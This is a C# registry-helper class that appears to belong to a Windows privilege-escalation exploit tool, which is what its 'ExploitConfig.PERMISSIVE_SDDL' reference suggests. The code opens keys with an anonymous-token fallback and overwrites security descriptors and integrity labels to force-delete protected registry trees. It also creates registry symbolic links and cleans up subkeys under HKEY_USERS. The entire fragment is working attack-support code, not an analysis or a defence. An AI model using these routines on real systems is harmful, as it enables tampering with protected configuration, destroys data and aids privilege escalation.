    #region Registry Service

    /// <summary>
    /// Dedicated service for all registry operations with error handling
    /// </summary>
    public class RegistryService
    {
        public NtKey OpenKey(NtKey root, string path, KeyAccessRights desiredAccess)
        {
            Logger.Debug($"Opening registry key: {path} with access: {desiredAccess}");

            try
            {
                using (var obja = new ObjectAttributes(path, AttributeFlags.OpenLink, root))
                {
                    using (var key = NtKey.Open(obja, desiredAccess, KeyCreateOptions.NonVolatile, false))
                    {
                        if (key.IsSuccess)
                        {
                            Logger.Debug($"Successfully opened key: {path}");
                            return key.Result.Duplicate();
                        }
                    }

                    Logger.Debug($"Retrying with anonymous token for: {path}");
                    using (var imp = NtThread.Current.ImpersonateAnonymousToken())
                    {
                        return NtKey.Open(obja, desiredAccess, KeyCreateOptions.NonVolatile);
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Error($"Failed to open registry key: {path}", ex);
                throw;
            }
        }

        public void SetSecurityDescriptor(NtKey key, SecurityInformation info)
        {
            try
            {
                Logger.Debug($"Setting security descriptor on: {key.FullPath}");
                var sd = new SecurityDescriptor(ExploitConfig.PERMISSIVE_SDDL);
                key.SetSecurityDescriptor(sd, info);
                Logger.Debug($"Security descriptor set successfully on: {key.FullPath}");
            }
            catch (Exception ex)
            {
                Logger.Error($"Failed to set security descriptor on: {key.FullPath}", ex);
                throw;
            }
        }

        public void ForceDeleteKey(NtKey root, string name)
        {
            Logger.Info($@"Force deleting registry key: {root.FullPath}\{name}");

            try
            {
                // Step 1: Open for WriteDac
                using (var key = OpenKey(root, name, KeyAccessRights.WriteDac))
                {
                    Logger.Debug("Opened for WriteDac");
                    SetSecurityDescriptor(key, SecurityInformation.Dacl);
                }

                // Step 2: Open for WriteOwner
                using (var key = OpenKey(root, name, KeyAccessRights.WriteOwner))
                {
                    Logger.Debug("Opened for WriteOwner");
                    SetSecurityDescriptor(key, SecurityInformation.Label);
                }

                // Step 3: Delete recursively
                using (var key = OpenKey(root, name, KeyAccessRights.Delete | KeyAccessRights.EnumerateSubKeys))
                {
                    Logger.Debug("Opened for enumeration and deletion");
                    DeleteRegistryTree(key);
                    key.Delete();
                    Logger.Info($"Successfully deleted: {name}");
                }
            }
            catch (Exception ex)
            {
                Logger.Error($"Failed to force delete key: {name}", ex);
                throw;
            }
        }

        public void DeleteRegistryTree(NtKey root)
        {
            try
            {
                Logger.Debug($"Deleting registry tree under: {root.FullPath}");
                foreach (var name in root.QueryKeys())
                {
                    ForceDeleteKey(root, name);
                }
            }
            catch (Exception ex)
            {
                Logger.Error($"Failed to delete registry tree: {root.FullPath}", ex);
                throw;
            }
        }

        public void CreateSymbolicLink(string linkPath, string targetPath)
        {
            try
            {
                Logger.Info($"Creating symbolic link: {linkPath} -> {targetPath}");
                NtKey.CreateSymbolicLink(linkPath, null, targetPath);
                Logger.Info("Symbolic link created successfully");
            }
            catch (Exception ex)
            {
                Logger.Error($"Failed to create symbolic link: {linkPath} -> {targetPath}", ex);
                throw;
            }
        }

        public void SetRegistryValue(string keyPath, string valueName, object value)
        {
            try
            {
                Logger.Debug($"Setting registry value: {keyPath}\\{valueName} = {value}");
                using (var key = NtKey.Open(keyPath, null, KeyAccessRights.SetValue))
                {
                    key.SetValue(valueName, value);
                    Logger.Debug("Registry value set successfully");
                }
            }
            catch (Exception ex)
            {
                Logger.Error($"Failed to set registry value: {keyPath}\\{valueName}", ex);
                throw;
            }
        }

        public void CleanupSubkeys(string targetKey, string subkeyPath)
        {
            try
            {
                Logger.Info($"Cleaning up subkeys under: {subkeyPath}");
                using (var key = Registry.Users.OpenSubKey(subkeyPath, RegistryRights.FullControl))
                {
                    if (key == null)
                    {
                        Logger.Warning($"Key not found: {subkeyPath}");
                        return;
                    }

                    foreach (var subkey in key.GetSubKeyNames())
                    {
                        var fullSubkeyPath = $@"{targetKey}\{subkey}";
                        Logger.Debug($"Cleaning up subkey: {fullSubkeyPath}");

                        NtKey ntSubkey = null;
                        try
                        {
                            ntSubkey = NtKey.Open(fullSubkeyPath, null, KeyAccessRights.WriteDac);
                        }
                        catch (Exception)
                        {
                            Logger.Debug("Standard open failed, using OpenKey method");
                            ntSubkey = OpenKey(null, fullSubkeyPath, KeyAccessRights.WriteDac);
                        }

                        SetSecurityDescriptor(ntSubkey, SecurityInformation.Dacl);
                        ntSubkey.Close();

                        ntSubkey = NtKey.Open(fullSubkeyPath, null, KeyAccessRights.Delete);
                        ntSubkey.Delete();
                        ntSubkey.Close();

                        Logger.Debug($"Subkey deleted: {fullSubkeyPath}");
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Error($"Failed to cleanup subkeys: {subkeyPath}", ex);
                throw;
            }
        }
    }

